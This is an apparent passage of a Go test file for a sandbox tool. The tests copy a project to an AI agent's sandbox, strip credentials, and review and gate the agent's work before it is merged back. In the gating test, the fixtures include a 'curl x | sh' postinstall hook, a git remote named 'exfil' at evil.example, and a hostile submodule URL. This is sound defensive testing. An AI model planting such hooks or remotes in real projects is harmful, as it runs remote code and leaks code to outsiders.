// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

//go:build !windows

package workspace

import (
	"bytes"
	"context"
	"encoding/base64"
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strings"
	"testing"
)

const remoteRepo = "/sandbox/work/myapp"

// launchCopy stages, uploads and baselines e.project into a fake sandbox.
func launchCopy(t *testing.T, e *env, name string, mutate func(*StageOptions)) (*CopyRecord, *fakeSandbox) {
	t.Helper()
	fs := newFakeSandbox(t, e)
	opts := e.stageOpts(name)
	if mutate != nil {
		mutate(&opts)
	}
	if _, err := Stage(bg, opts); err != nil {
		t.Fatal(err)
	}
	if _, err := Upload(bg, e.data, name, fs, fs); err != nil {
		t.Fatal(err)
	}
	rec, err := EstablishBaseline(bg, e.data, name, fs)
	if err != nil {
		t.Fatal(err)
	}
	return rec, fs
}

func (e *env) stageOpts(name string) StageOptions {
	return StageOptions{Project: e.project, Name: name, DataDir: e.data, Home: e.home}
}

func (e *env) refreshOpts(name string, fs *fakeSandbox) RefreshOptions {
	return RefreshOptions{Stage: e.stageOpts(name), Exec: fs, Upload: fs}
}

func pull(t *testing.T, e *env, fs *fakeSandbox, name string) *PullResult {
	t.Helper()
	pr, err := Pull(bg, PullOptions{DataDir: e.data, Name: name, Exec: fs, Scanners: []ContentScanner{SecretsScanner()}})
	if err != nil {
		t.Fatal(err)
	}
	return pr
}

func apply(e *env, name string, mode ApplyMode, mutate func(*ApplyOptions)) (*ApplyResult, error) {
	opts := ApplyOptions{DataDir: e.data, Name: name, Mode: mode}
	if mutate != nil {
		mutate(&opts)
	}
	return Apply(bg, opts)
}

// mustApply merges the last pull into the project and wants it applied.
func mustApply(t *testing.T, e *env, name string) *ApplyResult {
	t.Helper()
	res, err := apply(e, name, ApplyMerge, nil)
	if err != nil || !res.Applied {
		t.Fatalf("apply: %+v, %v", res, err)
	}
	return res
}

func TestStageGitProjectIsSanitized(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	for i := 0; i < 5; i++ {
		writeFile(t, e.project, "history.txt", strings.Repeat("x", i+1))
		e.commit("c")
	}
	e.git(e.project, "remote", "add", "origin", "https://alice:ghp_secret@github.com/acme/myapp.git")
	e.git(e.project, "remote", "add", "mirror", "git@github.com:acme/myapp.git")
	e.git(e.project, "remote", "add", "local", filepath.Join(e.home, "upstream.git"))
	writeFile(t, e.project, ".git/hooks/pre-commit", "#!/bin/sh\nexit 1\n")
	writeFile(t, e.project, "config/server.key", "tracked secret\n")
	e.git(e.project, "add", "-f", "config/server.key")
	e.git(e.project, "commit", "-q", "-m", "key")
	writeFile(t, e.project, "certs/dev.pem", "untracked secret\n")
	writeFile(t, e.project, "wip.txt", "uncommitted\n")
	writeFile(t, e.project, "README.md", "hello, modified\n")
	writeFile(t, e.project, "debug.log", "ignored\n")
	writeFile(t, e.project, "node_modules/x/i.js", "untracked cache\n")

	opts := e.stageOpts("c1")
	opts.GitDepth = 3
	rec, err := Stage(bg, opts)
	if err != nil {
		t.Fatal(err)
	}
	if rec.Kind != CopyGit || rec.RemoteDir != remoteRepo || rec.RemoteGitDir != remoteRepo+"/.git" {
		t.Fatalf("record: %+v", rec)
	}
	// Credentials are stripped from remotes and local-path remotes dropped.
	if _, local := rec.Remotes["local"]; local || len(rec.Remotes) != 2 ||
		rec.Remotes["origin"] != "https://github.com/acme/myapp.git" || rec.Remotes["mirror"] != "git@github.com:acme/myapp.git" {
		t.Fatalf("remotes = %v", rec.Remotes)
	}
	if strings.Join(rec.HeldBack, ",") != "certs/dev.pem,config/server.key" {
		t.Fatalf("held back = %v", rec.HeldBack)
	}
	// The held-back list is reported from HeldBack alone, not again among
	// the warnings (the run printed it twice).
	for _, w := range rec.Warnings {
		if strings.Contains(w, "certs/dev.pem") {
			t.Fatalf("a warning repeats the held-back list: %q", w)
		}
	}
	// What git ignores and an untracked package cache are named, directories
	// first, with the way on (GAP-0194).
	if w := "not copied (git ignores them, or they are package caches): node_modules/, debug.log; install the dependencies inside the sandbox"; !strings.Contains(strings.Join(rec.Warnings, "\n"), w) {
		t.Fatalf("warnings = %q, want %q", rec.Warnings, w)
	}
	stage := rec.Stage
	sg := func(args ...string) string { return runGit(t, e.home, stage, args...) }
	if n := sg("rev-list", "--count", "HEAD"); n != "3" {
		t.Fatalf("history depth = %s, want 3", n)
	}
	if strings.Contains(readFile(t, stage, ".git/config"), "ghp_secret") {
		t.Fatal("credentials leaked into the staged config")
	}
	if entries, _ := os.ReadDir(filepath.Join(stage, ".git", "hooks")); len(entries) != 0 {
		t.Fatalf("staged repo has hooks: %v", entries)
	}
	wantFiles(t, stage, "certs/dev.pem", absent, "config/server.key", absent, "debug.log", absent, "node_modules", absent,
		"wip.txt", "uncommitted\n", "README.md", "hello, modified\n")
	// Held-back tracked files must not show as deleted.
	if status := sg("status", "--porcelain"); strings.Contains(status, "server.key") || !strings.Contains(status, "M README.md") || !strings.Contains(status, "?? wip.txt") {
		t.Fatalf("staged status = %q", status)
	}
	// The baseline sits on the project's HEAD and holds the working tree.
	if sg("rev-parse", "refs/defenseclaw/baseline^") != e.git(e.project, "rev-parse", "HEAD") || sg("show", "refs/defenseclaw/baseline:wip.txt") != "uncommitted" {
		t.Fatal("the baseline is not the project's HEAD plus its working tree")
	}
}

// TestStageRefusesOversizedFolders: a folder over the size limit, the home
// folder, and a plain folder a walk reads only in part (it must not be
// staged as if that part were all of it) are refused, leaving nothing.
func TestStageRefusesOversizedFolders(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	writeFile(t, e.project, "big.bin", strings.Repeat("b", 64<<10))
	opts := e.stageOpts("c1")
	opts.MaxBytes = 16 << 10
	if _, err := Stage(bg, opts); !errors.Is(err, ErrTooLarge) {
		t.Fatalf("err = %v, want ErrTooLarge", err)
	}
	wantFiles(t, e.data, "sandboxes/c1/copy", absent)
	opts = e.stageOpts("c2")
	opts.Project = e.home
	if _, err := Stage(bg, opts); !errors.Is(err, ErrUnsafeSource) {
		t.Fatalf("home: %v", err)
	}

	e.project = filepath.Join(e.home, "code", "plain")
	for _, rel := range []string{"a.txt", "d/b.txt", "d/c.txt", "e.txt"} {
		writeFile(t, e.project, rel, rel+"\n")
	}
	// Five entries: a walk that stops at four.
	opts = e.stageOpts("p1")
	opts.MaxWalkEntries = 4
	var tl *TooLargeError
	if _, err := Stage(bg, opts); !errors.As(err, &tl) || !errors.Is(err, ErrTooLarge) || !tl.Entries || tl.Limit != 4 {
		t.Fatalf("err = %v", err)
	}
	if _, err := LoadCopy(e.data, "p1"); !errors.Is(err, ErrCopyNotFound) {
		t.Fatalf("refused stage left a record: %v", err)
	}
	// Nor a data directory teardown would list (GAP-0274).
	if _, err := os.Stat(filepath.Join(e.data, "sandboxes", "p1")); !errors.Is(err, os.ErrNotExist) {
		t.Fatalf("refused stage left sandboxes/p1: %v", err)
	}
	opts.MaxWalkEntries = 5
	if rec, err := Stage(bg, opts); err != nil || rec.Kind != CopyPlain || rec.Files != 4 {
		t.Fatalf("record: %+v, %v", rec, err)
	}
}

// GAP-0250: a copy left a submodule's working tree out without a word, and
// the baseline recorded the submodule as removed, so a sandbox that
// initialized it (or the pull of an untouched one) showed it as a change.
// The copy says so, and the submodule's commit survives an untouched pull.
func TestCopyKeepsAnUninitializedSubmodule(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	sha := e.git(e.project, "rev-parse", "HEAD")
	e.git(e.project, "update-index", "--add", "--cacheinfo", "160000,"+sha+",vendor/hello")
	writeFile(t, e.project, ".gitmodules", "[submodule \"vendor/hello\"]\n\tpath = vendor/hello\n\turl = https://example.invalid/hello.git\n")
	e.git(e.project, "add", ".gitmodules")
	e.git(e.project, "commit", "-q", "-m", "submodule")
	rec, fs := launchCopy(t, e, "c1", nil)
	if !slices.ContainsFunc(rec.Warnings, func(w string) bool { return strings.HasPrefix(w, "1 submodule is not copied: vendor/hello") }) {
		t.Fatalf("warnings = %v", rec.Warnings)
	}
	// Even with its empty folder gone, the submodule is not removed.
	if err := os.RemoveAll(fs.local(remoteRepo + "/vendor/hello")); err != nil {
		t.Fatal(err)
	}
	if pr := pull(t, e, fs, "c1"); !pr.Empty() {
		t.Fatalf("pull of an untouched copy = %+v", pr.Changes)
	}
	// The agent's `git submodule update --init` checks out the same commit.
	sub := fs.local(remoteRepo + "/vendor/hello")
	if out, err := exec.Command("git", "clone", "-q", e.project, sub).CombinedOutput(); err != nil {
		t.Fatalf("clone: %v %s", err, out)
	}
	if out, err := exec.Command("git", "-C", sub, "checkout", "-q", sha).CombinedOutput(); err != nil {
		t.Fatalf("checkout: %v %s", err, out)
	}
	if pr := pull(t, e, fs, "c1"); !pr.Empty() {
		t.Fatalf("pull after the submodule was initialized = %+v", pr.Changes)
	}
}

// GAP-0248: --unmask on a copy was silent both ways: a shared secret-looking
// file got no line, and a pattern that matched only a git-ignored file
// (never copied) said nothing. The record names both.
func TestStageNamesWhatUnmaskShared(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	writeFile(t, e.project, ".gitignore", "local.env\n")
	e.commit("ignore")
	writeFile(t, e.project, ".env", "TOKEN=dccert-decoy\n")
	writeFile(t, e.project, "local.env", "TOKEN=dccert-decoy\n")
	opts := e.stageOpts("c1")
	// .env.example is a pack default the project lacks: no warning for it,
	// only for what the run asked (GAP-0308).
	opts.Unmask = []string{".env", "local.env", ".env.example"}
	opts.UnmaskAsked = []string{".env", "local.env"}
	rec, err := Stage(bg, opts)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Join(rec.Unmasked, ",") != ".env" || slices.Contains(rec.HeldBack, ".env") {
		t.Fatalf("unmasked %v, held back %v", rec.Unmasked, rec.HeldBack)
	}
	if !slices.ContainsFunc(rec.Warnings, func(w string) bool { return strings.HasPrefix(w, "--unmask local.env matched no file the copy takes") }) ||
		slices.ContainsFunc(rec.Warnings, func(w string) bool { return strings.Contains(w, ".env.example") }) {
		t.Fatalf("warnings = %v", rec.Warnings)
	}
}

// GAP-0207: a copy's work could be read only by writing a patch file;
// PullDiff shows the last pull as the diff the patch would hold.
func TestPullDiff(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	_, fs := launchCopy(t, e, "c1", nil)
	fs.write(remoteRepo+"/README.md", "agent version\n")
	pull(t, e, fs, "c1")
	diff, err := PullDiff(bg, e.data, "c1")
	if err != nil || !strings.Contains(diff, "+++ b/README.md") || !strings.Contains(diff, "+agent version") {
		t.Fatalf("diff = %q, %v", diff, err)
	}
}

// TestCopyReapplyKeepsThePreApplyState: applying the same work again, or a
// conflicting apply (which falls back to a branch and a patch in the
// project folder, under fresh names each time, kept when the copy is
// deleted), leaves the undo point alone; a real second apply moves it and
// the reflog keeps the first one.
func TestCopyReapplyKeepsThePreApplyState(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	_, fs := launchCopy(t, e, "c1", nil)
	fs.write(remoteRepo+"/README.md", "agent version\n")
	pull(t, e, fs, "c1")
	first := mustApply(t, e, "c1")
	pre := e.git(e.project, "rev-parse", first.PreApplyRef)
	unmoved := func(step string) {
		t.Helper()
		if now := e.git(e.project, "rev-parse", first.PreApplyRef); now != pre {
			t.Fatalf("%s moved %s from %s to %s", step, first.PreApplyRef, pre, now)
		}
	}

	// A second pull of the same work has nothing new: the folder has it.
	if again := pull(t, e, fs, "c1"); !again.Empty() || again.Since == "" {
		t.Fatalf("second pull = %+v; want nothing new since the apply", again)
	}
	if again, err := apply(e, "c1", ApplyMerge, nil); !errors.Is(err, ErrNoChanges) {
		t.Fatalf("second apply = %+v, %v; want nothing to apply", again, err)
	}
	unmoved("a second apply of the same work")
	if got := e.git(e.project, "show", first.PreApplyRef+":README.md"); got != "hello" {
		t.Fatalf("pre-apply README = %q", got)
	}

	writeFile(t, e.project, "README.md", "host version\n")
	fs.write(remoteRepo+"/README.md", "agent version 2\n")
	pull(t, e, fs, "c1")
	res, err := apply(e, "c1", ApplyMerge, nil)
	if err != nil || res.Applied || strings.Join(res.Conflicts, ",") != "README.md" || res.Branch != "dc/c1" ||
		res.PatchPath != filepath.Join(e.project, "c1.patch") {
		t.Fatalf("conflict result: %+v, %v", res, err)
	}
	wantFiles(t, e.project, "README.md", "host version\n")
	if got := e.git(e.project, "show", "dc/c1:README.md"); got != "agent version 2" || !strings.Contains(readFile(t, e.project, "c1.patch"), "+agent version 2") {
		t.Fatalf("fallback branch content = %q", got)
	}
	if res, err := apply(e, "c1", ApplyMerge, nil); err != nil || res.Branch != "dc/c1-2" || res.PatchPath != filepath.Join(e.project, "c1-2.patch") {
		t.Fatalf("second fallback: %+v, %v", res, err)
	}
	unmoved("a conflicting apply")

	writeFile(t, e.project, "README.md", "agent version\n")
	fs.write(remoteRepo+"/README.md", "agent version\n")
	fs.write(remoteRepo+"/NEW.md", "new\n")
	pull(t, e, fs, "c1")
	mustApply(t, e, "c1")
	if now := e.git(e.project, "rev-parse", first.PreApplyRef); now == pre {
		t.Fatal("a real apply did not move the pre-apply ref")
	}
	if log := e.git(e.project, "reflog", "show", "--format=%H", first.PreApplyRef); !strings.Contains(log, pre) {
		t.Fatalf("the reflog of %s lost the first apply's state:\n%s", first.PreApplyRef, log)
	}
	must(t, DeleteCopy(e.data, "c1"))
	wantFiles(t, e.project, "c1.patch", present, "c1-2.patch", present)
}

// TestCopyPullStartsFromTheLastApply: once an apply put the sandbox's work
// in the folder, the next pull (a session end, `sandbox pull`) shows only
// what changed since, flags only that, and its apply merges only that, so
// what the operator took back of the earlier work stays taken back. An
// undo of the apply starts the next pull from the baseline again (cert
// hermes:HERMES-5, openhands:MAC-OSH-OH-2: a second session with no edits
// offered the same three files, the Makefile warning and two questions,
// then said "nothing to apply").
func TestCopyPullStartsFromTheLastApply(t *testing.T) {
	testPullStartsFromTheLastApply(t, newEnv(t))
}

// TestCopyPullStartsFromTheLastApplyOnGit239: git 2.38 and 2.39 have
// merge-tree --write-tree but not --merge-base; the apply still merges
// from where the pull's review started, so work the operator took back
// after an earlier apply does not come back unreviewed.
func TestCopyPullStartsFromTheLastApplyOnGit239(t *testing.T) {
	e := newSerialEnv(t)
	pinHostGit(t, gitVersion{2, 39, 5})
	testPullStartsFromTheLastApply(t, e)
}

// pinHostGit makes the package see host git v for the rest of a serial
// test.
func pinHostGit(t *testing.T, v gitVersion) {
	t.Helper()
	hostGit.mu.Lock()
	savedV, savedOK := hostGit.v, hostGit.ok
	hostGit.v, hostGit.ok = v, true
	hostGit.mu.Unlock()
	t.Cleanup(func() {
		hostGit.mu.Lock()
		hostGit.v, hostGit.ok = savedV, savedOK
		hostGit.mu.Unlock()
	})
}

func testPullStartsFromTheLastApply(t *testing.T, e *env) {
	t.Helper()
	e.initRepo()
	_, fs := launchCopy(t, e, "c1", nil)
	fs.write(remoteRepo+"/Makefile", "all:\n\techo hi\n")
	fs.write(remoteRepo+"/README.md", "agent version\n")
	first := pull(t, e, fs, "c1")
	if first.Since != "" || changePaths(first.Changes) != "A:Makefile M:README.md" || !first.Review.Sensitive() && riskFlags(first) == "" {
		t.Fatalf("first pull: since %q, changes %s, flags %s", first.Since, changePaths(first.Changes), riskFlags(first))
	}
	if _, err := apply(e, "c1", ApplyMerge, func(o *ApplyOptions) { o.AcceptSensitive = true }); err != nil {
		t.Fatal(err)
	}

	// A session that changed nothing: nothing to review or bring back.
	if again := pull(t, e, fs, "c1"); !again.Empty() || again.Since != first.Effective || len(again.Review.Flags) != 0 {
		t.Fatalf("pull after the apply: since %q (want %q), changes %s, flags %s", again.Since, first.Effective, changePaths(again.Changes), riskFlags(again))
	}
	if pr, err := LoadPull(e.data, "c1"); err != nil || !pr.HandedOver() {
		t.Fatalf("an empty pull after an apply is not handed over: %+v, %v", pr, err)
	}

	// The operator takes back the README; the agent adds a file.
	writeFile(t, e.project, "README.md", "hello\n")
	fs.write(remoteRepo+"/NEW.md", "new\n")
	next := pull(t, e, fs, "c1")
	if changePaths(next.Changes) != "A:NEW.md" || len(next.Review.Flags) != 0 {
		t.Fatalf("pull of new work: changes %s, flags %s; want only NEW.md", changePaths(next.Changes), riskFlags(next))
	}
	if res := mustApply(t, e, "c1"); changePaths(res.Changes) != "A:NEW.md" {
		t.Fatalf("apply of new work changed %s", changePaths(res.Changes))
	}
	wantFiles(t, e.project, "README.md", "hello\n", "NEW.md", "new\n", "Makefile", "all:\n\techo hi\n")
	// A patch holds only what is new too.
	fs.write(remoteRepo+"/LATER.md", "later\n")
	pull(t, e, fs, "c1")
	patch := filepath.Join(e.home, "later.patch")
	if _, err := apply(e, "c1", ApplyPatch, func(o *ApplyOptions) { o.PatchPath = patch }); err != nil {
		t.Fatal(err)
	}
	if got := readFile(t, e.home, "later.patch"); !strings.Contains(got, "+later") || strings.Contains(got, "NEW.md") || strings.Contains(got, "Makefile") {
		t.Fatalf("patch:\n%s", got)
	}

	// Undoing the apply: the next pull offers the undone work again.
	if res, err := undoApply(e, "c1", false); err != nil || !res.Undone {
		t.Fatalf("undo: %+v, %v", res, err)
	}
	if again := pull(t, e, fs, "c1"); again.Since != "" || !strings.Contains(changePaths(again.Changes), "A:NEW.md") {
		t.Fatalf("pull after the undo: since %q, changes %s; want it from the baseline", again.Since, changePaths(again.Changes))
	}
}

// riskFlags lists a pull's review flags, for failure messages.
func riskFlags(pr *PullResult) string {
	var out []string
	for _, f := range pr.Review.Flags {
		out = append(out, f.Path+":"+string(f.Kind))
	}
	return strings.Join(out, " ")
}

func undoApply(e *env, name string, preview bool) (*UndoApplyResult, error) {
	return UndoApply(bg, UndoApplyOptions{DataDir: e.data, Name: name, Preview: preview})
}

// TestCopyRoundTripAndUndoApply: the agent's committed and uncommitted
// work merges into the project next to the operator's own edits, over a
// bundle the host reads through exec, where it counts every byte (the
// CLI's download, which unpacks an archive the agent made, is unused).
// Undoing the apply reverts what it brought in and keeps the operator's
// edits; it refuses while the operator has edited the same files since,
// and deleting the sandbox drops its handle, not the operator's pre-apply
// ref.
func TestCopyRoundTripAndUndoApply(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	writeFile(t, e.project, "wip.txt", "operator wip\n")
	rec, fs := launchCopy(t, e, "c1", nil)
	if len(fs.uploads) == 0 || !pathExists(fs.local(remoteRepo+"/.git")) || rec.Stage != "" || !pathExists(rec.BaseGit) {
		t.Fatalf("after upload: uploads %v, stage=%q base=%q", fs.uploads, rec.Stage, rec.BaseGit)
	}
	if _, err := undoApply(e, "c1", true); !errors.Is(err, ErrNothingApplied) {
		t.Fatalf("undo before any apply = %v", err)
	}
	fs.agent(remoteRepo, "rm", "-q", "src/app.go")
	fs.agent(remoteRepo, "commit", "-q", "-m", "agent: drop app.go")
	fs.write(remoteRepo+"/README.md", "agent version\n")
	fs.write(remoteRepo+"/NEW.md", "new\n")
	hostIgnore := "*.log\nbuild/\n.env\nhost/\n"
	writeFile(t, e.project, ".gitignore", hostIgnore)
	if pr := pull(t, e, fs, "c1"); changePaths(pr.Changes) != "A:NEW.md D:src/app.go M:README.md" || len(pr.Blocking) != 0 || len(fs.downloads) != 0 {
		t.Fatalf("pull: changes %s, blocking %v, downloads %v", changePaths(pr.Changes), pr.Blocking, fs.downloads)
	}
	if res := mustApply(t, e, "c1"); len(res.Conflicts) != 0 || e.git(e.project, "rev-parse", "--verify", res.PreApplyRef+":README.md") == "" {
		t.Fatalf("apply: %+v (the pre-apply state must be kept)", res)
	}
	wantFiles(t, e.project, "README.md", "agent version\n", "NEW.md", "new\n", "src/app.go", absent, ".gitignore", hostIgnore, "wip.txt", "operator wip\n")
	if cached, refs := e.git(e.project, "diff", "--cached", "--name-only"), e.git(e.project, "for-each-ref", "refs/defenseclaw/copy/c1/result"); cached != "" || refs != "" {
		t.Fatalf("apply touched the index (%q) or left temporary import refs (%q)", cached, refs)
	}
	writeFile(t, e.project, "wip.txt", "more operator wip\n")

	prev, err := undoApply(e, "c1", true)
	if got := changePaths(prev.Changes); err != nil || got != "A:src/app.go D:NEW.md M:README.md" || prev.Undone || prev.PreApplyRef == "" {
		t.Fatalf("preview = %s %+v, %v", got, prev, err)
	}
	wantFiles(t, e.project, "README.md", "agent version\n")
	if res, err := undoApply(e, "c1", false); err != nil || !res.Undone {
		t.Fatalf("undo: %+v, %v", res, err)
	}
	wantFiles(t, e.project, "README.md", "hello\n", "NEW.md", absent, "src/app.go", "package main\n", ".gitignore", hostIgnore, "wip.txt", "more operator wip\n")
	if cached := e.git(e.project, "diff", "--cached", "--name-only"); cached != "" {
		t.Fatalf("undo touched the index: %q", cached)
	}
	if _, err := undoApply(e, "c1", true); !errors.Is(err, ErrNothingApplied) {
		t.Fatalf("a second undo = %v", err)
	}

	// The work can be brought back; an undo over the operator's own edit
	// of the same file is refused until it is resolved by hand.
	mustApply(t, e, "c1")
	writeFile(t, e.project, "README.md", "the operator's rewrite\n")
	if res, err := undoApply(e, "c1", false); err != nil || res.Undone || strings.Join(res.Conflicts, ",") != "README.md" {
		t.Fatalf("overlapping undo = %+v, %v", res, err)
	}
	wantFiles(t, e.project, "README.md", "the operator's rewrite\n")
	writeFile(t, e.project, "README.md", "agent version\n")
	if res, err := undoApply(e, "c1", false); err != nil || !res.Undone {
		t.Fatalf("undo after resolving: %+v, %v", res, err)
	}
	wantFiles(t, e.project, "README.md", "hello\n")

	mustApply(t, e, "c1")
	must(t, DeleteCopy(e.data, "c1"))
	if refs := e.git(e.project, "for-each-ref", "--format=%(refname)", "refs/defenseclaw/copy/c1/"); refs != "refs/defenseclaw/copy/c1/pre-apply" {
		t.Fatalf("refs after delete = %q", refs)
	}
}

func TestCopyKeepsLineEndingSettingsConsistent(t *testing.T) {
	e := newEnv(t)
	e.git(e.project, "init", "-q", "-b", "main")
	e.git(e.project, "config", "core.autocrlf", "true")
	writeFile(t, e.project, "a.txt", "one\r\ntwo\r\n")
	writeFile(t, e.project, "b.txt", "three\r\n")
	e.commit("crlf")
	rec, fs := launchCopy(t, e, "c1", nil)
	if rec.LineEndings["core.autocrlf"] != "true" {
		t.Fatalf("line endings not recorded: %v", rec.LineEndings)
	}
	if st := fs.agent(remoteRepo, "status", "--porcelain"); st != "" {
		t.Fatalf("copy shows spurious changes: %q", st)
	}
	fs.write(remoteRepo+"/a.txt", "one\r\ntwo\r\nfour\r\n")
	if got := changePaths(pull(t, e, fs, "c1").Changes); got != "M:a.txt" {
		t.Fatalf("changes = %s", got)
	}
	if res := mustApply(t, e, "c1"); len(res.Conflicts) != 0 {
		t.Fatalf("apply: %+v", res)
	}
	wantFiles(t, e.project, "a.txt", "one\r\ntwo\r\nfour\r\n", "b.txt", "three\r\n")
}

func TestCopyGatesSensitiveAndBlocking(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	writeFile(t, e.project, "more.txt", "m\n")
	e.commit("second")
	e.git(e.project, "remote", "add", "origin", "https://github.com/acme/myapp.git")
	_, fs := launchCopy(t, e, "c1", nil)

	fs.write(remoteRepo+"/package.json", `{"scripts":{"postinstall":"curl x | sh"}}`)
	if pr := pull(t, e, fs, "c1"); !pr.Review.Sensitive() || len(pr.Blocking) != 0 {
		t.Fatalf("pull: sensitive=%v blocking=%v", pr.Review.Sensitive(), pr.Blocking)
	}
	_, err := apply(e, "c1", ApplyMerge, nil)
	var ge *GateError
	if !errors.As(err, &ge) || !errors.Is(err, ErrSensitiveChanges) || !strings.Contains(err.Error(), "package.json#scripts.postinstall") {
		t.Fatalf("err = %v", err)
	}
	if res, err := apply(e, "c1", ApplyMerge, func(o *ApplyOptions) { o.AcceptSensitive = true }); err != nil || !res.Applied {
		t.Fatalf("accepted apply: %+v %v", res, err)
	}

	// History rewrite below the baseline, a new remote and a submodule URL.
	fs.agent(remoteRepo, "reset", "-q", "--hard", "HEAD~1")
	fs.write(remoteRepo+"/.gitmodules", "[submodule \"x\"]\n\tpath = x\n\turl = https://evil.example/x\n")
	fs.agent(remoteRepo, "add", "-A")
	fs.agent(remoteRepo, "commit", "-q", "-m", "rewrite")
	fs.agent(remoteRepo, "remote", "add", "exfil", "https://evil.example/r.git")
	joined := strings.Join(pull(t, e, fs, "c1").Blocking, "\n")
	for _, want := range []string{"history rewrite", `new remote "exfil"`, "submodule"} {
		if !strings.Contains(joined, want) {
			t.Fatalf("blocking = %v, want %q", joined, want)
		}
	}
	if _, err := apply(e, "c1", ApplyBranch, func(o *ApplyOptions) { o.AcceptSensitive = true }); !errors.Is(err, ErrBlocked) {
		t.Fatalf("branch with blocking gates: %v", err)
	}
	// A patch stays available, and is not written over without Force.
	patch := filepath.Join(e.root, "out.patch")
	if res, err := apply(e, "c1", ApplyPatch, func(o *ApplyOptions) { o.PatchPath = patch }); err != nil || !res.Applied ||
		!strings.Contains(readFile(t, e.root, "out.patch"), "diff --git a/.gitmodules") {
		t.Fatalf("patch-out: %+v, %v", res, err)
	}
	if _, err := apply(e, "c1", ApplyPatch, func(o *ApplyOptions) { o.PatchPath = patch }); err == nil {
		t.Fatal("existing patch file overwritten without Force")
	}
	if res, err := apply(e, "c1", ApplyBranch, func(o *ApplyOptions) { o.AcceptSensitive, o.Force = true, true }); err != nil || res.Branch != "dc/c1" {
		t.Fatalf("forced branch: %+v %v", res, err)
	}
	// The branch holds this result now: bringing it back there again lands
	// nothing, so no gate stops it (TestCopyBranchThatHoldsThePull).
	if res, err := apply(e, "c1", ApplyBranch, nil); err != nil || !res.UpToDate || res.Applied || res.Branch != "dc/c1" {
		t.Fatalf("the same result on its branch again: %+v %v", res, err)
	}
}

// TestCopyPullFlagsAZeroFilledTail (GAP-0289): a MicroVM the gateway
// restarted under wrote notes.txt, which came back as its text and a tail
// of zero bytes, and the pull said nothing. The review flags it (info: it
// runs no code), not a binary file of zeros.
func TestCopyPullFlagsAZeroFilledTail(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	_, fs := launchCopy(t, e, "c1", nil)
	fs.write(remoteRepo+"/notes.txt", "line 1\nline 2\n"+strings.Repeat("\x00", 48))
	fs.write(remoteRepo+"/zeros.bin", strings.Repeat("\x00", 64))
	pr := pull(t, e, fs, "c1")
	var flagged []string
	for _, f := range pr.Review.Flags {
		if f.Kind == RiskZeroFilled {
			flagged = append(flagged, f.Path)
			if f.Severity != SeverityInfo || !strings.HasPrefix(f.Detail, "ends in 48 zero bytes") {
				t.Fatalf("flag = %+v", f)
			}
		}
	}
	if len(flagged) != 1 || flagged[0] != "notes.txt" || pr.Review.Sensitive() {
		t.Fatalf("zero-filled flags = %v (sensitive %v), want notes.txt only", flagged, pr.Review.Sensitive())
	}
}

// TestCopyPullOfAStateAlreadyBroughtBack: a pull of the state the last one
// took, from the same point, counts as brought back when that one went to a
// branch or a patch file (a new capture of uncommitted work is another
// commit of the same tree), so the sandbox is not held for work that is in
// the patch; new work is not (#964).
func TestCopyPullOfAStateAlreadyBroughtBack(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	_, fs := launchCopy(t, e, "c1", nil)
	fs.write(remoteRepo+"/agent.txt", "agent work\n")
	pull(t, e, fs, "c1")
	if _, err := apply(e, "c1", ApplyPatch, func(o *ApplyOptions) { o.PatchPath = filepath.Join(e.root, "c1.patch") }); err != nil {
		t.Fatal(err)
	}
	if same := pull(t, e, fs, "c1"); !same.HandedOver() || same.Empty() {
		t.Fatalf("a pull of the state the patch took: %+v", same)
	}
	if st, err := PendingWork(bg, e.data, "c1", nil); err != nil || st.Work == CopyWorkUnapplied {
		t.Fatalf("stopped after it: %+v, %v", st, err)
	}
	fs.write(remoteRepo+"/agent.txt", "more agent work\n")
	if next := pull(t, e, fs, "c1"); next.HandedOver() {
		t.Fatalf("a pull of new work counts as brought back: %+v", next)
	}
}

// TestCopyBranchLeavesOutTheFoldersEdits (GAP-0282): a copy made from a
// folder with uncommitted edits (another live sandbox had made them) put
// them on its pull's branch as if the sandbox had made them. The branch
// starts at the copy's HEAD with only the sandbox's changes, and the edits
// stay in the folder; when the sandbox changed them further, the branch
// keeps them and says so.
func TestCopyBranchLeavesOutTheFoldersEdits(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	head := e.git(e.project, "rev-parse", "HEAD")
	writeFile(t, e.project, "README.md", "hello\nhost edit\n")
	_, fs := launchCopy(t, e, "c1", nil)
	fs.write(remoteRepo+"/agent.txt", "agent work\n")
	pull(t, e, fs, "c1")
	res, err := apply(e, "c1", ApplyBranch, nil)
	if err != nil || !res.Applied || len(res.Warnings) != 1 ||
		!strings.Contains(res.Warnings[0], "from when the copy was made (README.md) are not on it, and stay in your working tree") {
		t.Fatalf("branch: %+v, %v", res, err)
	}
	if got := e.git(e.project, "diff", "--name-only", head, "dc/c1"); got != "agent.txt" {
		t.Fatalf("the branch holds %q, want agent.txt only", got)
	}
	if parent := e.git(e.project, "rev-parse", "dc/c1^"); parent != head {
		t.Fatalf("the branch starts at %s, want the copy's HEAD %s", parent, head)
	}
	if got := readFile(t, e.project, "README.md"); got != "hello\nhost edit\n" {
		t.Fatalf("README.md = %q, want the folder's edit kept", got)
	}
	if held, err := CheckApply(bg, ApplyOptions{DataDir: e.data, Name: "c1", Mode: ApplyBranch}); err != nil || !held {
		t.Fatalf("the branch does not hold the pull: %v, %v", held, err)
	}
	fs.write(remoteRepo+"/README.md", "hello\nhost edit, and the agent's\n")
	pull(t, e, fs, "c1")
	res, err = apply(e, "c1", ApplyBranch, func(o *ApplyOptions) { o.Branch = "dc/c1-more" })
